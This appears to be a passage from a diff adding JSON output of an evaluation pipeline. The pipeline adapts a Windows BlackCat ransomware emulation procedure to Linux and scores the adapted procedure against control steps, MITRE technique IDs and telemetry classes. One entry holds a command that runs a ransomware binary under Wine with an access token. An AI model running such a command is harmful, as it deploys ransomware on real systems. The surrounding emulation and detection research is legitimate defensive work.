+        "action_index": 26,
+        "refinement_type": "command_update",
+        "before": "# unsupported \u2013 LSASS does not exist on Linux",
+        "after": "wine /tmp/digirevenge.exe --access-token 15742aa362a84ba3",
+        "reason": "Execute Windows ransomware binary on Linux using Wine."
+      }
+    ],
+    "warnings": [
+      "Steps using Wine assume Wine is installed on the target system."
+    ]
+  },
+  "evaluation": {
+    "metadata": {
+      "source_file": "./blackcat_procedure.md",
+      "control_file": "./enriched_control.json",
+      "source_os": "windows",
+      "target_os": "linux",
+      "evaluated_at": "2026-01-21T13:29:58.103814",
+      "model": "openai/gpt-oss-120b"
+    },
+    "missing_steps": {
+      "name": "missing_steps",
+      "passed": false,
+      "detail": "Missing control step IDs: 28, 29, 30"
+    },
+    "extra_steps": {
+      "name": "extra_steps",
+      "passed": true,
+      "detail": ""
+    },
+    "os_constructs_valid": {
+      "name": "os_constructs_valid",
+      "passed": false,
+      "detail": "Step 7: .exe extension (pattern); Step 8: .exe extension (pattern); Step 10: .exe extension (pattern); Step 16: .exe extension (pattern); Step 18: .exe extension (pattern); Step 19: .exe extension (pattern); Step 20: .exe extension (pattern); Step 24: .exe extension (pattern); Step 25: .exe extension (pattern); Step 27: .exe extension (pattern)"
+    },
+    "technique_ids_match": {
+      "name": "technique_ids_match",
+      "passed": false,
+      "detail": "Control 1 (T1078.001) vs Variant 1 (T1105); Control 3 (T1105) vs Variant 3 (T1021.001); Control 4 (T1078.001) vs Variant 4 (T1021.001); Control 5 (T1078.001) vs Variant 5 (T1087.002); Control 6 (T1105) vs Variant 6 (T1078.003); Control 7 (T1087.002) vs Variant 7 (T1105); Control 8 (T1197) vs Variant 8 (T1552.001); Control 9 (T1003) vs Variant 9 (T1021.001); Control 10 (T1078.001) vs Variant 10 (T1552.001); Control 11 (T1197) vs Variant 11 (T1562.001); Control 12 (T1003) vs Variant 12 (T1562.001); Control 13 (T1562.001) vs Variant 13 (T1112); Control 14 (T1562.001) vs Variant 14 (T1003.001); Control 15 (T1112) vs Variant 15 (T1567.001); Control 16 (T1003.001) vs Variant 16 (T1105); Control 17 (T1105) vs Variant 17 (T1046); Control 18 (T1048.003) vs Variant 18 (T1021.004); Control 19 (T1018) vs Variant 19 (T1059); Control 20 (T1197) vs Variant 20 (T1567.002); Control 21 (T1021.002) vs Variant 21 (T1105); Control 22 (T1025) vs Variant 22 (T1021.004); Control 23 (T1105) vs Variant 23 (T1059); Control 24 (T1021.004) vs Variant 24 (T1105); Control 25 (T1059.001) vs Variant 25 (T1059); Control 26 (T1486) vs Variant 26 (T1070.001); Control 27 (T1059.003) vs Variant 27 (T1486)"
+    },
+    "parent_technique_ids_match": {
+      "name": "parent_technique_ids_match",
+      "passed": false,
+      "detail": "Control 1 (T1078.001) vs Variant 1 (T1105); Control 3 (T1105) vs Variant 3 (T1021.001); Control 4 (T1078.001) vs Variant 4 (T1021.001); Control 5 (T1078.001) vs Variant 5 (T1087.002); Control 6 (T1105) vs Variant 6 (T1078.003); Control 7 (T1087.002) vs Variant 7 (T1105); Control 8 (T1197) vs Variant 8 (T1552.001); Control 9 (T1003) vs Variant 9 (T1021.001); Control 10 (T1078.001) vs Variant 10 (T1552.001); Control 11 (T1197) vs Variant 11 (T1562.001); Control 12 (T1003) vs Variant 12 (T1562.001); Control 13 (T1562.001) vs Variant 13 (T1112); Control 14 (T1562.001) vs Variant 14 (T1003.001); Control 15 (T1112) vs Variant 15 (T1567.001); Control 16 (T1003.001) vs Variant 16 (T1105); Control 17 (T1105) vs Variant 17 (T1046); Control 18 (T1048.003) vs Variant 18 (T1021.004); Control 19 (T1018) vs Variant 19 (T1059); Control 20 (T1197) vs Variant 20 (T1567.002); Control 21 (T1021.002) vs Variant 21 (T1105); Control 22 (T1025) vs Variant 22 (T1021.004); Control 23 (T1105) vs Variant 23 (T1059); Control 24 (T1021.004) vs Variant 24 (T1105); Control 26 (T1486) vs Variant 26 (T1070.001); Control 27 (T1059.003) vs Variant 27 (T1486)"
+    },
+    "telemetry_classes_match": {
+      "name": "telemetry_classes_match",
+      "passed": false,
+      "detail": "Missing telemetry classes: registry"
+    },
+    "extra_telemetry_classes": {
+      "name": "extra_telemetry_classes",
+      "passed": false,
+      "detail": "Extra telemetry classes: other"
+    },
+    "telemetry_diversity": {
+      "name": "telemetry_diversity",
+      "passed": true,
+      "detail": ""
+    },
+    "telemetry_multi_class": {
+      "name": "telemetry_multi_class",
+      "passed": true,
+      "detail": ""
+    },
+    "all_pass": false
+  }
+}
